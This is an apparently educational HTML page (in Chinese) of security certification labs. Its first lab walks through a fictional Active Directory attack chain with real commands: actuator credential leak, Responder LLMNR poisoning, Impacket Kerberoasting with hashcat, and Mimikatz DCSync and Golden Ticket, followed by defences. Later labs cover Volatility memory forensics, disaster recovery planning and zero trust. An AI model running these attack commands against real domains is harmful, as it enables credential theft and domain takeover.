@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>企業級真實實作實驗室專題 (Hands-on Labs) | CyberZen</title>
+  <meta name="description" content="CISSP、SSCP、CEH、CHFI、ECSA 企業級端到端實做實驗室。高中生白話詳解每一步驟、含手把手指令、真實終端輸出分析、漏洞復現與防禦落地指南。">
+  <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+
+  <!-- 頂部導航 -->
+  <header class="zen-topbar">
+    <a href="index.html" class="zen-brand">
+      <div class="logo-mark">禪</div>
+      <div class="title-wrap">
+        <div class="title">CyberZen 資安之道</div>
+        <div class="subtitle">企業實做實驗室 · 動手真功夫</div>
+      </div>
+    </a>
+    <nav>
+      <ul class="zen-nav-links">
+        <li><a href="index.html">研習首頁</a></li>
+        <li><a href="cissp-sscp.html">CISSP / SSCP 治理架構</a></li>
+        <li><a href="ceh-ecsa.html">CEH / ECSA 攻防滲透</a></li>
+        <li><a href="chfi.html">CHFI 數位鑑識</a></li>
+        <li><a href="enterprise-labs.html" class="active">企業實做實驗室</a></li>
+        <li><a href="exam-simulator.html">必勝模擬考場</a></li>
+        <li><a href="../../index.html" class="btn-hub-return">← 回作品集 Hub</a></li>
+      </ul>
+    </nav>
+  </header>
+
+  <main class="zen-container">
+
+    <!-- 標頭區 -->
+    <section class="zen-hero" style="padding-bottom: 1.5rem;">
+      <div class="zen-hero-stamp-wrap">
+        <span class="zen-stamp">動手實作</span>
+        <span class="zen-stamp green">每一步驟詳解</span>
+        <span class="zen-stamp amber">企業真實情境</span>
+      </div>
+      <h1>企業級端到端 <span class="highlight">實戰實驗室專題</span></h1>
+      <p class="lead">
+        紙上談兵終覺淺，絕知此事要躬行。<br>
+        本專題設計 4 大橫跨外網突破、AD 網域提權、勒索記憶體取證與 BIA 災難決策的企業真實劇本，<br>
+        從高中生秒懂的白話前情提要，到工程師真實敲下的每一行指令與防禦落地策略，全方位鑄造頂級實力。
+      </p>
+    </section>
+
+    <!-- 實驗室導航錨點 -->
+    <div style="display: flex; gap: 10px; justify-content: center; flex-wrap: wrap; margin-bottom: 2.5rem;">
+      <a href="#lab1" class="zen-stamp" style="text-decoration: none; padding: 6px 14px; font-size: 0.85rem;">🧪 Lab 1: DMZ 突破與 AD 網域滲透</a>
+      <a href="#lab2" class="zen-stamp green" style="text-decoration: none; padding: 6px 14px; font-size: 0.85rem;">🔬 Lab 2: 勒索病毒記憶體鑑識</a>
+      <a href="#lab3" class="zen-stamp amber" style="text-decoration: none; padding: 6px 14px; font-size: 0.85rem;">🏛️ Lab 3: 企業 BIA 與災難復原演練</a>
+      <a href="#lab4" class="zen-stamp" style="text-decoration: none; padding: 6px 14px; font-size: 0.85rem; border-color: var(--accent-indigo); color: var(--accent-indigo);">🛡️ Lab 4: 零信任 IAM 條件存取</a>
+    </div>
+
+    <!-- =========================================================================
+         LAB 1: DMZ 突破與 AD 網域滲透 (CEH / ECSA / CPENT)
+         ========================================================================= -->
+    <div class="zen-section-header" id="lab1">
+      <h2 class="zen-section-title">🧪 實做題 1 · 跨國科技企業 DMZ 外網突破至 AD 網域完全奪權 (CEH / ECSA)</h2>
+    </div>
+
+    <div class="zen-card">
+      <div class="hs-easy-box" style="margin-top: 0;">
+        <span class="badge">🧒 高中生秒懂背景情境</span>
+        <h4>案發現場：小偷如何從小職員電腦打入全公司金庫？</h4>
+        <p>
+          這家公司的網站很漂亮，但在後台忘記把「工程測試網址」關掉。駭客從小測試頁面拿到資料庫密碼進入內網，接著在辦公室區域發假廣播騙取帳號密碼，最後透過 Kerberos 票證漏洞一舉奪下全公司的網域管理員 (Domain Admin) 總鑰匙！
+        </p>
+      </div>
+
+      <div class="enterprise-box">
+        <span class="badge">🏢 企業實戰拓撲環境</span>
+        <p>
+          • <strong>目標企業</strong>：Apex Global Tech (網域：<code>apex.corp</code>)<br>
+          • <strong>外網 DMZ 伺服器</strong>：<code>198.51.100.25</code> (Linux Apache Tomcat / Spring Boot 客戶入口)<br>
+          • <strong>內網網域控制站 (DC)</strong>：<code>10.0.10.5</code> (Windows Server 2022 <code>DC01.apex.corp</code>)<br>
+          • <strong>資料庫與應用伺服器</strong>：<code>10.0.20.15</code> (執行 <code>MSSQL_SVC</code> 服務帳號)
+        </p>
+      </div>
+
+      <div class="step-timeline">
+        <!-- 步驟 1 -->
+        <div class="step-item">
+          <div class="step-badge">1</div>
+          <div class="step-content">
+            <h4>步驟 1：外網情報偵察與漏洞利用 (External Recon & Initial Shell)</h4>
+            <p style="font-size: 0.92rem; color: var(--ink-secondary);">
+              攻擊者針對目標外網 IP 執行 Nmap 掃描，發現 8080 端口暴露了 Spring Boot Actuator 的未授權存取端點 <code>/actuator/env</code>，從中提取到明文的內網資料庫連線憑證：
+            </p>
+
+            <div class="zen-terminal">
+              <div class="zen-terminal-header">
+                <span class="terminal-title">Kali Terminal - 外網探測</span>
+              </div>
+              <pre><code><span class="cmd-prompt">attacker@kali:~$</span> curl -s http://198.51.100.25:8080/actuator/env | jq .
+<span class="cmd-output">{
+  "propertySources": [
+    {
+      "name": "applicationConfig: [classpath:/application.properties]",
+      "properties": {
+        "spring.datasource.username": { "value": "app_db_user" },
+        "spring.datasource.password": { "value": "Winter2025!Secret" }
+      }
+    }
+  ]
+}</span></code></pre>
+            </div>
+
+            <p style="font-size: 0.9rem; color: var(--ink-secondary);">
+              攻擊者進一步利用已知之 Spring Cloud Function RCE 漏洞 (CVE-2022-22963)，成功反彈一個 Meterpreter Reverse TCP Shell，在 DMZ 主機上取得 <code>tomcat</code> 使用者權限。
+            </p>
+          </div>
+        </div>
+
+        <!-- 步驟 2 -->
+        <div class="step-item">
+          <div class="step-badge">2</div>
+          <div class="step-content">
+            <h4>步驟 2：內網跳板穿透與 LLMNR 廣播毒化 (Pivoting & Responder)</h4>
+            <p style="font-size: 0.92rem; color: var(--ink-secondary);">
+              攻擊者將 DMZ 主機作為跳板 (Pivot)，向辦公網段 <code>10.0.10.0/24</code> 啟動 <strong>Responder</strong> 工具。當辦公室某員工在檔案總管誤鍵入不存在的共享名稱 <code>\\fileshare_internal</code> 時，Windows 自動發送 LLMNR 廣播：
+            </p>
+
+            <div class="zen-terminal">
+              <div class="zen-terminal-header"><span class="terminal-title">Responder 監聽毒化輸出</span></div>
+              <pre><code><span class="cmd-prompt">attacker@kali:~$</span> responder -I eth1 -wrf
+<span class="cmd-output">[+] [LLMNR]  Poisoned answer sent to 10.0.10.82 for name fileshare_internal
+[+] [SMB] NTLMv2-SSP Hash Received from 10.0.10.82:
+apex.corp\j.doe::APEX:1122334455667788:A9C8D4F7E...
+[+] 儲存至 logs/SMB-NTLMv2-SSP-10.0.10.82.txt</span></code></pre>
+            </div>
+
+            <p style="font-size: 0.9rem; color: var(--ink-secondary);">
+              攻擊者將截獲的 Hash 丟入 <strong>Hashcat</strong> 以 <code>rockyou.txt</code> 字典檔離線破解，3 秒內算出員工 <code>j.doe</code> 的密碼為 <code>Football2024!</code>。
+            </p>
+          </div>
+        </div>
+
+        <!-- 步驟 3 -->
+        <div class="step-item">
+          <div class="step-badge">3</div>
+          <div class="step-content">
+            <h4>步驟 3：Kerberoasting 票據提取與離線密碼爆破</h4>
+            <p style="font-size: 0.92rem; color: var(--ink-secondary);">
+              使用剛剛破獲的網域使用者 <code>j.doe</code> 憑證，攻擊者使用 <strong>Impacket</strong> 套件向網域控制站請求所有註冊了 SPN 的服務票據 (TGS)：
+            </p>
+
+            <div class="zen-terminal">
+              <div class="zen-terminal-header"><span class="terminal-title">Impacket GetUserSPNs.py</span></div>
+              <pre><code><span class="cmd-prompt">attacker@kali:~$</span> python3 GetUserSPNs.py apex.corp/j.doe:Football2024! -dc-ip 10.0.10.5 -request
+<span class="cmd-output">ServicePrincipalName: MSSQLSvc/sql01.apex.corp:1433
+User: mssql_svc
+$krb5tgs$23$*mssql_svc$apex.corp*$MSSQLSvc/sql01.apex.corp:1433*... [Hash Extracted]</span>
+
+<span class="cmd-comment"># 使用 Hashcat 模式 13100 (Kerberos 5 TGS-REP etype 23) 離線秒殺：</span>
+<span class="cmd-prompt">attacker@kali:~$</span> hashcat -m 13100 krb_tgs.hash rockyou.txt
+<span class="cmd-output">Status: Cracked!
+Result: mssql_svc:SummerP@ssw0rd123</span></code></pre>
+            </div>
+          </div>
+        </div>
+
+        <!-- 步驟 4 -->
+        <div class="step-item">
+          <div class="step-badge">4</div>
+          <div class="step-content">
+            <h4>步驟 4：BloodHound 提權路徑分析與 Golden Ticket 奪權</h4>
+            <p style="font-size: 0.92rem; color: var(--ink-secondary);">
+              透過 BloodHound 圖形化分析，發現 <code>mssql_svc</code> 帳號對網域群組 <code>Domain Admins</code> 擁有 <strong>GenericAll (完全控制權限)</strong>！攻擊者登入資料庫主機，利用 Mimikatz 執行 DCSync 導出網域核心帳號 <code>krbtgt</code> 的 NTLM Hash，製作黃金票據：
+            </p>
+
+            <div class="zen-terminal">
+              <div class="zen-terminal-header"><span class="terminal-title">Mimikatz DCSync 奪取 krbtgt</span></div>
+              <pre><code><span class="cmd-prompt">mimikatz #</span> lsadump::dcsync /domain:apex.corp /user:krbtgt
+<span class="cmd-output">[SAM Log] User : krbtgt
+NTLM : b86c52b2170327429188e44dd479a0b1</span>
+
+<span class="cmd-comment"># 鍛造長達 10 年有效的偽造神級 TGT (Golden Ticket)</span>
+<span class="cmd-prompt">mimikatz #</span> kerberos::golden /user:Administrator /domain:apex.corp /sid:S-1-5-21-254... /krbtgt:b86c52b2170327429188e44dd479a0b1 /ptt
+<span class="cmd-danger">[*] Golden Ticket for 'Administrator' successfully submitted for this current session!</span></code></pre>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- 企業防禦落地處方 -->
+      <div class="enterprise-box" style="margin-top: 1.5rem;">
+        <span class="badge">🛡️ 企業 CISO 必勝防禦落地處方</span>
+        <ul>
+          <li><strong>全面停用 LLMNR 與 NetBIOS-NS</strong>：透過網域群組原則 (GPO) 關閉廣播名稱解析，Responder 直接失效。</li>
+          <li><strong>將服務帳號改為 gMSA (群組受控服務帳號)</strong>：密碼長達 120 字元且由 Windows DC 每 30 天自動輪替，徹底粉碎 Kerberoasting 字典攻擊。</li>
+          <li><strong>實施階層式管理模型 (Tiered Administration Model)</strong>：禁止網域管理員 (Tier 0) 帳號登入一般員工主機或 DMZ 伺服器，切斷橫向移動跳板。</li>
+        </ul>
+      </div>
+    </div>
+
+    <!-- =========================================================================
+         LAB 2: 勒索病毒記憶體鑑識 (CHFI)
+         ========================================================================= -->
+    <div class="zen-section-header" id="lab2">
+      <h2 class="zen-section-title">🔬 實做題 2 · 跨國金融機構勒索病毒事件應變與 Volatility 記憶體鑑識 (CHFI)</h2>
+    </div>
+
+    <div class="zen-card">
+      <div class="hs-easy-box" style="margin-top: 0;">
+        <span class="badge">🧒 高中生秒懂背景情境</span>
+        <h4>案發現場：電腦硬碟空空如也，病毒躲在哪裡搞破壞？</h4>
+        <p>
+          這是一種最狡猾的「隱形木馬（無檔案惡意程式）」。駭客寄了一封假的「年終獎金明細表」Word 檔，員工一打開，裡面的惡意巨集指令立刻在記憶體深處悄悄運作，甚至借屍還魂偽裝成微軟正常的系統處理程序。調查官必須在關機前把<strong>記憶體整個抽出來</strong>，在顯微鏡下抓出隱形真兇！
+        </p>
+      </div>
+
+      <div class="step-timeline">
+        <div class="step-item">
+          <div class="step-badge">1</div>
+          <div class="step-content">
+            <h4>步驟 1：符合 RFC 3227 標準之記憶體傾印擷取 (Live RAM Acquisition)</h4>
+            <p style="font-size: 0.92rem; color: var(--ink-secondary);">
+              鑑識調查官接獲通報後<strong>絕對不重開機、不拔電源</strong>。攜帶預先驗證過的唯讀隨身碟與 <strong>WinPmem</strong> 鑑識工具，執行實體記憶體完整傾印，並計算 SHA-256 雜湊值記錄於保管鏈表單：
+            </p>
+
+            <div class="zen-terminal">
+              <div class="zen-terminal-header"><span class="terminal-title">CMD (Admin) - WinPmem 擷取</span></div>
+              <pre><code><span class="cmd-prompt">E:\Forensics></span> winpmem_mini_x64.exe -o mem_dump_case882.raw
+<span class="cmd-output">[+] Writing 16384 MB physical memory to mem_dump_case882.raw ... Done.</span>
+
+<span class="cmd-prompt">E:\Forensics></span> certutil -hashfile mem_dump_case882.raw SHA256
+<span class="cmd-output">SHA256: 7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069
+CertUtil: -hashfile command completed successfully.</span></code></pre>
+            </div>
+          </div>
+        </div>
+
+        <div class="step-item">
+          <div class="step-badge">2</div>
+          <div class="step-content">
+            <h4>步驟 2：使用 Volatility 3 繪製進程樹，鎖定異常父子進程</h4>
+            <p style="font-size: 0.92rem; color: var(--ink-secondary);">
+              將記憶體鏡像拷貝回鑑識工作站，啟動 <code>windows.pstree</code> 檢查異常的程式呼叫關係：
+            </p>
+
+            <div class="zen-terminal">
+              <div class="zen-terminal-header"><span class="terminal-title">Volatility 3 pstree 分析</span></div>
+              <pre><code><span class="cmd-prompt">forensic@box:~$</span> python3 vol.py -f mem_dump_case882.raw windows.pstree
+<span class="cmd-output">...
+* 0x82a10 4120 1820 explorer.exe
+** 0x83c40 5844 4120 WINWORD.EXE          <-- 員工開啟釣魚 Office 檔案
+*** 0x84d10 6112 5844 cmd.exe             <-- 異常：Word 呼叫命令提示字元！
+**** 0x85e20 6340 6112 powershell.exe     <-- 執行 Base64 編碼的惡意下載腳本
+***** 0x86f30 7108 6340 svchost.exe       <-- 致命疑點：svchost 居然由 powershell 啟動！</span></code></pre>
+            </div>
+            <p style="font-size: 0.9rem; color: var(--accent-vermilion); font-weight: 600;">
+              ⚠️ 鑑識結論：微軟標準架構中，<code>svchost.exe</code> 必須由 <code>services.exe</code> 啟動！此處由 <code>powershell.exe</code> 啟動的 PID 7108 必然是進程空心化 (Process Hollowing) 偽裝的惡意程式！
+            </p>
+          </div>
+        </div>
+
+        <div class="step-item">
+          <div class="step-badge">3</div>
+          <div class="step-content">
+            <h4>步驟 3：使用 malfind 萃取注入代碼與 C2 惡意連線</h4>
+            <p style="font-size: 0.92rem; color: var(--ink-secondary);">
+              執行 <code>windows.malfind</code> 掃描 PID 7108 的虛擬記憶體分頁，定位具有執行/讀寫權限的注入區塊：
+            </p>
+
+            <div class="zen-terminal">
+              <div class="zen-terminal-header"><span class="terminal-title">Volatility 3 malfind 與 netscan</span></div>
+              <pre><code><span class="cmd-prompt">forensic@box:~$</span> python3 vol.py -f mem_dump_case882.raw windows.malfind --pid 7108
+<span class="cmd-output">PID: 7108 Process: svchost.exe Address: 0x21a0000
+4d 5a 90 00 03 00 00 00 ... MZ......  <-- 赫然發現隱藏的 PE 執行檔 MZ 標頭！
+Protection: PAGE_EXECUTE_READWRITE</span>
+
+<span class="cmd-prompt">forensic@box:~$</span> python3 vol.py -f mem_dump_case882.raw windows.netscan | grep 7108
+<span class="cmd-danger">TCP 10.0.10.82:49812 -> 45.33.32.156:8443 (ESTABLISHED) PID: 7108 svchost.exe</span></code></pre>
+            </div>
+            <p style="font-size: 0.9rem; color: var(--ink-secondary);">
+              調查官從記憶體成功抽出惡意 C2 中繼站 IP <code>45.33.32.156</code>，立即將此 IoC (入侵指標) 推播給全公司防火牆全面阻斷回連！
+            </p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- =========================================================================
+         LAB 3: 企業 BIA 與災難復原演練 (CISSP / SSCP)
+         ========================================================================= -->
+    <div class="zen-section-header" id="lab3">
+      <h2 class="zen-section-title">🏛️ 實做題 3 · 半導體晶圓廠核心 ERP 業務衝擊分析 (BIA) 與災難復原實務 (CISSP)</h2>
+    </div>
+
+    <div class="zen-card">
+      <div class="hs-easy-box" style="margin-top: 0;">
+        <span class="badge">🧒 高中生秒懂背景情境</span>
+        <h4>商業大決策：工廠停工一小時損失 300 萬，該花多少錢買備用水電？</h4>
+        <p>
+          資安不只是阻擋駭客，更是保障「就算發生大地震，公司也不會倒閉」。這家工廠的生產線電腦一旦死機，每多停工一小時就要虧損數百萬。資安長必須拿著計算機精確算出：到底該花 500 萬租用隨時待命的「熱站 (Hot Site)」，還是花 100 萬租用兩天才能開機的「冷站 (Cold Site)」？
+        </p>
+      </div>
+
+      <div class="step-timeline">
+        <div class="step-item">
+          <div class="step-badge">1</div>
+          <div class="step-content">
+            <h4>步驟 1：量化業務衝擊評估 (Quantitative BIA Data)</h4>
+            <div class="zen-table-wrap">
+              <table class="zen-table">
+                <thead>
+                  <tr>
+                    <th>關鍵業務流程</th>
+                    <th>停機每小時財務損失</th>
+                    <th>最大容忍中斷時間 (MTD)</th>
+                    <th>復原時間目標 (RTO)</th>
+                    <th>復原點目標 (RPO)</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td><strong>晶圓製造執行系統 (MES)</strong></td>
+                    <td>新台幣 $3,500,000 / 時</td>
+                    <td><strong style="color: var(--accent-vermilion);">2 小時</strong></td>
+                    <td>1 小時內</td>
+                    <td>0 分鐘 (即時同步鏡像)</td>
+                  </tr>
+                  <tr>
+                    <td><strong>SAP ERP 財務結算</strong></td>
+                    <td>新台幣 $400,000 / 時</td>
+                    <td><strong>24 小時</strong></td>
+                    <td>8 小時內</td>
+                    <td>4 小時 (定期差異備份)</td>
+                  </tr>
+                  <tr>
+                    <td><strong>公司內部知識庫 Wiki</strong></td>
+                    <td>新台幣 $5,000 / 時</td>
+                    <td><strong>7 天</strong></td>
+                    <td>72 小時</td>
+                    <td>24 小時 (每日冷備份)</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </div>
+        </div>
+
+        <div class="step-item">
+          <div class="step-badge">2</div>
+          <div class="step-content">
+            <h4>步驟 2：災難復原架構決策 (Disaster Recovery Architecture)</h4>
+            <p style="font-size: 0.92rem; color: var(--ink-secondary);">
+              針對 MES 系統 (MTD = 2 小時)，絕對無法採用需要 24 小時以上才能部署硬體的冷站 (Cold Site)。CISO 團隊評估後向董事會提出雲端彈性熱備援 (Cloud Hot/Warm Hybrid) 方案：
+            </p>
+            <ul>
+              <li><strong>資料庫層級</strong>：跨可用區 (Multi-AZ) 同步複製，達成 <strong>RPO = 0</strong>。</li>
+              <li><strong>運算叢集層級</strong>：平常維持最小運算節點 (Warm)，監控偵測到主機房斷線 5 分鐘內自動藉由 Terraform / Kubernetes 彈性擴展 (Auto-scale) 瞬間頂替，達成 <strong>RTO = 30 分鐘</strong>。</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- =========================================================================
+         LAB 4: 零信任架構 IAM 條件存取實作 (SSCP)
+         ========================================================================= -->
+    <div class="zen-section-header" id="lab4">
+      <h2 class="zen-section-title">🛡️ 實做題 4 · 跨國遠距辦公之零信任架構 (Zero Trust) IAM 條件存取實作 (SSCP)</h2>
+    </div>
+
+    <div class="zen-card">
+      <div class="hs-easy-box" style="margin-top: 0;">
+        <span class="badge">🧒 高中生秒懂背景情境</span>
+        <h4>零信任就像「最高機密金庫的保全」：絕不相信任何人，每次進門都重新安檢</h4>
+        <p>
+          以前的傳統觀念是「只要你人在公司辦公室裡面連著內網，就預設你是好人」。但如果員工的筆電在家被植入木馬，一帶回公司內網，整個公司就完了！<br>
+          <strong>零信任原則 (Never Trust, Always Verify)</strong>：不管你是在總部辦公室還是在巴黎的咖啡廳，每次存取敏感資料，系統都要嚴格檢查：「你是誰？你用哪台電腦？防毒有沒有開？有沒有插實體安全金鑰？」
+        </p>
+      </div>
+
+      <div class="step-timeline">
+        <div class="step-item">
+          <div class="step-badge">1</div>
+          <div class="step-content">
+            <h4>步驟 1：配置 SAML 2.0 / OIDC 現代身分聯合驗證</h4>
+            <p style="font-size: 0.92rem; color: var(--ink-secondary);">
+              企業全面廢棄傳統 RADIUS/LDAP 容易遭受中間人與明文竊取的舊協定，全面導入 SAML 2.0 斷言與 OIDC (OpenID Connect) 權杖，並以 FIDO2 硬體金鑰 (YubiKey) 達成抵抗網路釣魚的無密碼 (Passwordless) 驗證。
+            </p>
+          </div>
+        </div>
+
+        <div class="step-item">
+          <div class="step-badge">2</div>
+          <div class="step-content">
+            <h4>步驟 2：條件式存取原則 (Conditional Access Policies) 策略矩陣</h4>
+            <div class="zen-table-wrap">
+              <table class="zen-table">
+                <thead>
+                  <tr>
+                    <th>情境與遙測訊號 (Signals)</th>
+                    <th>政策判定點 (PDP 判定)</th>
+                    <th>政策執行點 (PEP 處置作為)</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>公司受控筆電 + 台北總部 IP + 正常工作時間</td>
+                    <td><strong>低風險 (Low Risk)</strong></td>
+                    <td>直接放行，單一登入 (SSO) 存取 ERP。</td>
+                  </tr>
+                  <tr>
+                    <td>公司受控筆電 + 海外差旅飯店 Wi-Fi</td>
+                    <td><strong>中風險 (Medium Risk)</strong></td>
+                    <td>要求強制進行 FIDO2 硬體權杖二次驗證。</td>
+                  </tr>
+                  <tr>
+                    <td>員工私人 iPad (未安裝 MDM / EDR)</td>
+                    <td><strong>不合規裝置 (Non-compliant)</strong></td>
+                    <td>只允許在瀏覽器唯讀預覽文件，<strong>禁止下載與複製</strong>。</td>
+                  </tr>
+                  <tr>
+                    <td>10 分鐘前在台北登入，10 分鐘後在莫斯科登入</td>
+                    <td><strong>不可能的移動 (Impossible Travel - 高危)</strong></td>
+                    <td><strong style="color: var(--accent-vermilion);">立即封鎖帳號</strong>，發送重大安全事件通報 SOC。</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </main>
+
+  <footer class="zen-footer">
+    <div style="font-family: var(--font-serif); font-size: 1.1rem; color: var(--ink-primary); margin-bottom: 8px;">
+      CyberZen 資安之道 · 企業級端到端實作實驗室
+    </div>
+    <p>涵蓋真實企業攻防、數位鑑識與治理架構決策演練 · 手把手鑄造頂級實力</p>
+    <div style="margin-top: 14px;">
+      <a href="index.html">← 回研習首頁</a> ｜ <a href="exam-simulator.html">前往：必勝模擬考場 →</a>
+    </div>
+  </footer>
+
+</body>
+</html>
